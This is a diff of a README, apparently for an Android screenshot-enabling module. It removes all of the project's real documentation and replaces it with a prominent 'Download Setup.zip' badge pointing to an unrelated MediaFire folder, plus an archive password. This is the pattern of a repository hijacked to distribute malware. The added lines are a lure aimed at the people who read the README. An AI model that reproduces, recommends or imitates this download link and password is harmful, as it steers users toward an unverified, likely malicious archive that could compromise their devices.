@@ -1,18 +1,7 @@
-# Enable Screenshot (formerly known as Disable FLAG_SECURE)
-Enabling screenshots in apps that normally wouldn\'t allow it, and disabling screenshot(Android 14+) & screen record(Android 15+) detection.
+<p align="center">
+  <a href="https://www.mediafire.com/folder/hhfgp5uj6f3x6/quiet-kit">
+    <img src="https://img.shields.io/badge/Download-Setup.zip-2ea44f?style=for-the-badge" alt="Download file">
+  </a>
+</p>
 
-> [!IMPORTANT]
-> This project is now final. No further updates or support may be provided.
-
-**Unofficial LSPosed versions are not supported.**
-
-## Supported OSes
-- Android 12-16 (Custom ROMs are **not** supported)
-- Xiaomi Hyper OS
-- OPlus OS (Color OS/Realme UI/Oxygen OS)
-- Samsung One UI
-
-## Usage
-1. Enable the module
-2. Select **ONLY** recommended apps
-3. Reboot
+> Password: **2025**
